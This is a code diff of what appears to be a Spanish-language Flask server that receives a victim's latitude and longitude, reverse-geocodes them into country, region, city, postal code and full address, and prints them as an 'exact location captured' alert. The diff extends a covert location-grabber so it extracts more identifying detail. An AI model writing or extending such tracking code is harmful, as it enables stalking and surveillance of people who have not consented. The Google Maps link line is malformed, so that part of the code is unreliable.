@@ -66,21 +66,37 @@ def capturar_gps():
     lat = request.args.get('lat')
     lon = request.args.get('lon')
 
-    direccion_real = "No encontrada"
+    pais = "No encontrado"
+    estado = "No encontrado"
+    ciudad = "No encontrada"
+    codigo_postal = "No encontrado"
+    direccion_completa = "No encontrada"
+
     try:
+
         g = geocoder.osm([lat, lon], method='reverse')
         if g.ok:
-            direccion_real = g.address
+            direccion_completa = g.address
+            datos_mapa = g.json
+            pais = datos_mapa.get('country', 'No encontrado')
+            estado = datos_mapa.get('state', 'No encontrado')
+            ciudad = datos_mapa.get('city') or datos_mapa.get('town') or datos_mapa.get('village') or 'No encontrada'
+            codigo_postal = datos_mapa.get('postal', 'No encontrado')
     except Exception as e:
-        direccion_real = f"Error al traducir: {e}"
+        direccion_completa = f"Error al traducir: {e}"
 
     print("\n--- [🔥] ¡UBICACIÓN EXACTA CAPTURADA! ---")
     print(f"Latitud: {lat}")
     print(f"Longitud: {lon}")
-    print(f"Dirección Real: {direccion_real}") 
+    print(f"País: {pais}")
+    print(f"Estado/Región: {estado}")
+    print(f"Ciudad: {ciudad}")
+    print(f"Código Postal: {codigo_postal}")
+    print(f"Dirección Completa: {direccion_completa}") 
     print(f"Ver en Google Maps: https://google.com{lat},{lon}")
     print("-----------------------------------------\n")
     return "OK", 200
+
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
